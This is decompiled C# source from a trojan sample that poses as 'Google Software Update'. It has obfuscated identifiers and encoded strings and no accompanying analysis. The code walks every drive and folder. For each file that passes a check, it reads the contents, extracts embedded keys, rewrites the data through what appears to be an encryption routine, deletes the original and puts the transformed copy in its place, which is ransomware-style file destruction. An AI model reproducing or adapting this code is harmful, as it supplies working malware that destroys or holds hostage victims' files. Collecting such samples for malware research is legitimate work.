// Decompiled with JetBrains decompiler
// Type: C3904355907.C4110462503
// Assembly: Google Software Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1ECCB2B4-E3D0-48EA-84ED-06938D43796B
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-b37761715d5a2405a3fa75abccaf6bb15b7298673aaad91a158725be3c518a87.exe

using \u003Cdion2ntty2ic0uyoe\u003E\u007B43570453\u002D3AD8\u002D4A5B\u002DB273\u002D83DF8156D820\u007D;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace C3904355907
{
  public sealed class C4110462503
  {
    public void C3554254475()
    {
      Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Iv());
      DriveInfo[] drives = DriveInfo.GetDrives();
      C3463352047.C3554254475();
      Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.IW() + drives.Length.ToString() + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Iw());
      foreach (DriveInfo driveInfo in drives)
        this.C3554254475(driveInfo);
    }

    private void C3554254475([In] DriveInfo obj0)
    {
      Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz());
      Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.IX() + obj0.Name + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.aR());
      Trace.Indent();
      if (obj0.IsReady)
      {
        foreach (DirectoryInfo directory in obj0.RootDirectory.GetDirectories())
          this.C3554254475(directory);
      }
      else
        Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Ix());
      Trace.Unindent();
    }

    private void C3554254475([In] DirectoryInfo obj0)
    {
      Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz());
      Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.IY() + obj0.Name + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.aR());
      if (!C878818188.C3554254475(obj0.FullName))
      {
        Trace.Indent();
        Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Iy());
        Trace.Unindent();
      }
      else
      {
        try
        {
          DirectoryInfo[] directories = obj0.GetDirectories();
          if (directories != null)
          {
            foreach (DirectoryInfo directoryInfo in directories)
              this.C3554254475(directoryInfo);
          }
          foreach (FileInfo file in obj0.GetFiles())
            this.C3554254475(file);
        }
        catch (Exception ex)
        {
          Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz());
          Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.IZ());
          Trace.WriteLine(ex.ToString());
        }
      }
    }

    private void C3554254475([In] FileInfo obj0)
    {
      Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz());
      Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Iz() + obj0.Name + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.aR());
      Trace.Indent();
      if (C878818188.C3554254475(obj0))
      {
        Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iA());
        byte[] numArray1 = (byte[]) null;
        byte[] numArray2 = (byte[]) null;
        byte[] sourceArray = (byte[]) null;
        string str = obj0.FullName + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ia();
        C543223747.C3554254475(obj0, ref sourceArray);
        int c3904355907 = C3110715001.C3904355907;
        byte[] destinationArray1 = new byte[C3463352047.C3554254475.Length];
        Array.Copy((Array) sourceArray, c3904355907, (Array) destinationArray1, 0, C3463352047.C3554254475.Length);
        int sourceIndex = c3904355907 + destinationArray1.Length;
        byte[] destinationArray2 = new byte[C3463352047.C3904355907.Length];
        Array.Copy((Array) sourceArray, sourceIndex, (Array) destinationArray2, 0, C3463352047.C3904355907.Length);
        C3463352047.C3554254475(ref destinationArray1, ref numArray1, ref destinationArray2, ref numArray2);
        using (FileStream fileStream = File.Create(str))
        {
          fileStream.Position = 0L;
          C2181537457.C3554254475((Stream) fileStream, ref sourceArray, C3110715001.C3904355907 + destinationArray1.Length + destinationArray2.Length, numArray1, numArray2);
        }
        obj0.Delete();
        File.Copy(str, obj0.FullName);
        File.Delete(str);
      }
      else
        Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iB());
      Trace.Unindent();
    }
  }
}
